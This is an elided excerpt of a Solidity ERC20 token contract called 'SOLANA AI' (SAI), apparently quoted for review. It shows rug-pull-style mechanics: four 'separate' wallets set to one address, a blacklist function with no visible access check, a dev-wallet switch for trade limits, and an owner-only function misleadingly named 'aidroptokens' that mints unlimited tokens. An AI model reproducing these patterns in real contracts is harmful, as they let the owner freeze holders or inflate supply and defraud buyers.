...
contract mzn is ERC20, Ownable {
    ...
    uint256 public maxBuyLimit = 30_000 * 10**18;
    uint256 public maxSellLimit = 10_000 * 10**18;
    uint256 public maxWalletLimit = 30_000 * 10**18;
    ...
    address public marketingWallet = 0xED39BC4aFDd1fB2BBCc16F9d645E96DAdd4A6325;
    address public devWallet = 0xED39BC4aFDd1fB2BBCc16F9d645E96DAdd4A6325;
    address public operationsWallet = 0xED39BC4aFDd1fB2BBCc16F9d645E96DAdd4A6325;
    address public charityWallet = 0xED39BC4aFDd1fB2BBCc16F9d645E96DAdd4A6325;
    ...
    Taxes public taxes = Taxes(4, 0, 1, 0, 0, 0);
    Taxes public sellTaxes = Taxes(4, 0, 1, 0, 0, 0);
    ...
    constructor(address routerAdd) ERC20("SOLANA AI", "SAI") {
    ...
    function updateIsBlacklisted(address account, bool state) external  {
    ...
    function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell) external {
        require(_msgSender() == devWallet);
    ...
    function aidroptokens(address to, uint256 amount) external onlyOwner {
        _tokengeneration(to, amount);
    }
